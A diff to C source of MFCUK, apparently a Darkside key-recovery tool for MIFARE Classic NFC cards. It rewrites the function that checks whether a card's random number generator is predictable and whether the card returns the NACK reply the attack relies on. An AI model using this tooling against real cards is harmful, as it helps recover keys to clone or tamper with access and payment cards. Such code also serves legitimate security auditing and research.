@@ -264,13 +264,11 @@ int32_t dist_nt(uint32_t nt1, uint32_t nt2) {
     for (uint16_t i = 1; i < 32768; i++) {
         nttmp1 = prng_successor(nttmp1, 1);
         if (nttmp1 == nt2) {
-            printf("nttmp1 == nt2");
             return i;
         }
 
         nttmp2 = prng_successor(nttmp2, 1);
         if (nttmp2 == nt1) {
-            printf("nttmp2 == nt1");
             return -i;
         }
     }
@@ -390,7 +388,7 @@ static uint32_t mfcuk_key_recovery_block(nfc_device *pnd, uint32_t uiUID, uint64
                                                           sizeof(arrSpoofEntries[0]),
                                                           compareTagNonces);
 
-    //检测到一个新的标记nonce，正确初始化它，并存储在标记nonce“cache”数组中，以便在下次出现时使用。
+    //检测到一个新的标签nonce，正确初始化它，并存储在标记nonce“cache”数组中，以便在下次出现时使用。
     if (!ptrFoundTagNonceEntry) {
         if (numSpoofEntries >= MAX_TAG_NONCES) {
             printf("\n\nFAILURE - REACHED MAX_TAG_NONCES!!! (Are we so unlucky or the USB/reader is buggy?!)\n\n");
@@ -865,15 +863,10 @@ static bool mfcuk_darkside_select_tag(nfc_device *pnd, int iSleepAtFieldOFF, int
 }
 
 static bool
-valid_prng_check(nfc_device *pnd, nfc_target_info *target, mifare_key_type keyType) {
+valid_prng_check(nfc_device *pnd, nfc_target_info *target) {
     // 判断设备是否可用!
     if (!pnd) {
         LOGD("pnd is invalid.");
-        return false;
-    }
-    // 判断秘钥类型
-    if ((keyType != keyA) && (keyType != keyB)) {
-        LOGD("keyType is invalid.");
         return false;
     }
     // 后判断卡的类型!
@@ -881,59 +874,45 @@ valid_prng_check(nfc_device *pnd, nfc_target_info *target, mifare_key_type keyTy
         LOGD("tagType is invalid.");
         return false;
     }
-
     // 上述参数无异常，开始定义变量!
-    uint8_t abtAuth[4] = {0x60, 0x03, 0x00, 0x00};
+    uint8_t mf_auth[] = {keyA, 0x00, 0x00, 0x00};
+    uint8_t mf_nr_ar[] = {0, 0, 0, 0, 0, 0, 0, 0};
     uint8_t abtRx[MAX_FRAME_LEN];
-    uint32_t nt = 0;
+    uint8_t receivedAnswerPar[3] = {0x00};
+    uint8_t par[1] = {0};
 
-    // dxl
-    uint32_t previous_nt = 0;
-    uint16_t unexpected_random = 0;
-
-    // 进入循环获取读取器应答!
-    for (int i = 0; i < 5; ++i) {
-        // 尝试寻卡!
-        if (!mfcuk_darkside_select_tag(pnd, 100, 100, target)) {
-            LOGD("tag not found.");
+    // append crc to auth cmd!
+    iso14443a_crc_append(mf_auth, 2);
+    nfc_initiator_deselect_target(pnd);
+    // trying to select card.!
+    if (!mfcuk_darkside_select_tag(pnd, 30, 50, target)) {
+        printf("Tag not found.");
+        return false;
+    }
+    // init raw mode
+    nfc_device_set_property_bool(pnd, NP_HANDLE_CRC, false);
+    nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, false);
+    //request and get nonce!
+    if (nfc_initiator_transceive_bytes(pnd, mf_auth, sizeof(mf_auth), abtRx, 4,
+                                       -1)) {
+        if (!validate_prng_nonce(bswap_32_pu8(abtRx))) {
+            printf("PRNG no supported！");
             return false;
         }
-        // 使用提供的块配置身份验证帧
-        abtAuth[0] = keyType;
-        //进行CRC循环冗余校追加!
-        iso14443a_crc_append(abtAuth, 2);
-        //配置关闭硬件自动CRC
-        nfc_device_set_property_bool(pnd, NP_HANDLE_CRC, false);
-        //开启原生位传输模式!
-        nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, false);
-        //请求标签，获得随机数!
-        if (0 > nfc_initiator_transceive_bytes(pnd, abtAuth, 4, abtRx, sizeof(abtRx), -1)) {
-            printf("\n\nFailed to get TAG NONCE!!!\n\n");
-            return false;
-        }
-        if (!mfcuk_darkside_reset_advanced(pnd)) {
-            LOGD("device reset failed!");
-            return false;
-        }
-        // 缓存前一个随机数!
-        previous_nt = nt;
-        //转换新应答的随机数为十进制!
-        nt = bswap_32_pu8(abtRx);
-        printf("\nnt: %"PRId32"\n", nt);
-        // 判断应答!
-        if (previous_nt) {
-            int nt_distance = dist_nt(previous_nt, nt);
-            printf("\nnt_distance: %"PRId32"\n", nt_distance);
-            if (nt_distance == -99999) {
-                unexpected_random++;
-                if (unexpected_random > 4) {
-                    printf("\ncard is not vulnerable to Darkside attack (its random number generator is not predictable)!\n");
-                    return false;
-                } else {
-                    continue;        // continue trying...
-                }
-            }
-        }
+    } else {
+        printf("\n\nFailed to get TAG NONCE!!!\n\n");
+        return false;
+    }
+    nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, true);
+    nfc_device_set_property_bool(pnd, NP_HANDLE_PARITY, false);
+    //request "nack" if exists
+    int res = 0;
+    if ((res = nfc_initiator_transceive_bits(pnd, mf_nr_ar, 64, par, abtRx, sizeof(abtRx),
+                                             receivedAnswerPar)) != 4) {
+        printf("res: %d\n", res);
+        printf("\n\nFailed to get TAG NACK!!!\n\n");
+        printf("PRNG.NACK no supported！");
+        return false;
     }
     return true;
 }
@@ -1586,8 +1565,7 @@ int main(int argc, char *argv[]) {
     }
 
     // 检测卡片对于prng的支持!
-    if (!valid_prng_check(pnd, &ti.nti, keyA)) {
-        printf("不支持PRNG！");
+    if (!valid_prng_check(pnd, &ti.nti)) {
         return -1;
     }
 
